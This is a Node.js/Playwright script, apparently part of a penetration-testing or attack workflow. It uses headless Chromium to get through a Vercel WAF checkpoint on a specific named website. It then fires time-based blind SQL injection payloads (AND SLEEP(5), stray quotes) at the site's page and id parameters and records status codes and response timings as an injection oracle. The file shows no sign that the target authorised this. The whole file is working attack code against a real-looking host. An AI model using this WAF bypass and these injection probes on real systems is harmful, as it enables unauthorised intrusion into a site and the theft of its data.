// Build a WAF-passthrough oracle using headless Chromium (solves Vercel checkpoint).
import { chromium } from '/home/kali/.npm/_npx/e41f203b7505f1fb/node_modules/playwright-core/index.mjs';
import crypto from 'crypto';
const W = process.env.WORK_PATH;
const EXE = process.env.HOME + '/.cache/ms-playwright/chromium_headless_shell-1187/chrome-linux/headless_shell';
const b = await chromium.launch({executablePath: EXE, args:["--no-sandbox","--disable-dev-shm-usage"]});
const ctx = await b.newContext({viewport:{width:1366,height:900}});
const pg = await ctx.newPage();
await pg.goto("https://www.infinitycapital.bh/", {waitUntil:"domcontentloaded", timeout:60000});
await pg.waitForTimeout(12000);
console.log("TITLE:", await pg.title(), "URL:", pg.url());
console.log("COOKIES:", JSON.stringify(await ctx.cookies()).slice(0,600));

const tests = [
  ["baseline",        "https://www.infinitycapital.bh/"],
  ["page2",           "https://www.infinitycapital.bh/?page=2"],
  ["page3",           "https://www.infinitycapital.bh/?page=3"],
  ["page999",         "https://www.infinitycapital.bh/?page=999"],
  ["page_sleep_true", "https://www.infinitycapital.bh/?page=2%20AND%20SLEEP(5)"],
  ["page_sleep_false","https://www.infinitycapital.bh/?page=2%20AND%20SLEEP(0)"],
  ["page_quote",      "https://www.infinitycapital.bh/?page=2%27"],
  ["id1",             "https://www.infinitycapital.bh/?id=1"],
  ["id_sleep_true",   "https://www.infinitycapital.bh/?id=1%20AND%20SLEEP(5)"],
  ["zzz1",            "https://www.infinitycapital.bh/?zzz=1"],
];
const out = [];
for (const [name, url] of tests) {
  try {
    const r = await pg.evaluate(async (u) => {
      const t0 = performance.now();
      const res = await fetch(u, {redirect:"follow"});
      const txt = await res.text();
      return {status: res.status, len: txt.length, ms: Math.round(performance.now()-t0),
              redir: res.redirected, url: res.url,
              body: txt.slice(0,200),
              sig: txt.length + ":" + (txt.slice(0,120))};
    }, url);
    const rec = {name, url, ...r}; delete rec.body;
    out.push(rec);
    console.log(name, r.status, r.len, r.ms+"ms", r.url);
  } catch(e) { console.log(name, "ERR", e.message); }
}
const fs = await import('fs');
fs.writeFileSync(W+"/tool_outputs/oracle_chrome.json", JSON.stringify(out,null,1));
console.log("WROTE oracle_chrome.json");
await b.close();
